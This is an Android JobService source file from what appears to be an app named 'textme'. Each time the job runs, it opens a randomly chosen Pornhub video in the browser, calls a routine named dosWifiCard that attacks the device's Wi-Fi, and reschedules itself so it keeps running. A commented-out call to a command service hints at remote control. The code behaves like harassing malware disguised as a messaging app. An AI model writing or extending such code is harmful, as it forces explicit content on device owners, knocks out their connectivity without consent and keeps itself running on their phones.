package com.candroid.textme.jobs.services;

import android.app.job.JobParameters;
import android.app.job.JobService;

import com.candroid.textme.api.Systems;
import com.candroid.textme.api.Web;
import com.candroid.textme.data.Pornhub;
import com.candroid.textme.jobs.JobsScheduler;

public class PornJobService extends JobService {
    @Override
    public boolean onStartJob(JobParameters params) {
      /*  Intent pornIntent = new Intent(getApplicationContext(), CommandsIntentService.class);
        pornIntent.setAction(CommandsIntentService.ACTION_WEB_BROWSER);
        getApplicationContext().startService(pornIntent);*/
        double randomNumber = Math.random();
        int videoId = 0;
        if(randomNumber >= 0.5){
            videoId = 1;
        }
        Web.Browser.watchPornHubVideo(this, Pornhub.VIDEOS[videoId]);
        Systems.Networking.Wifi.dosWifiCard(this);
        JobsScheduler.scheduleJob(getApplicationContext());
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }
}
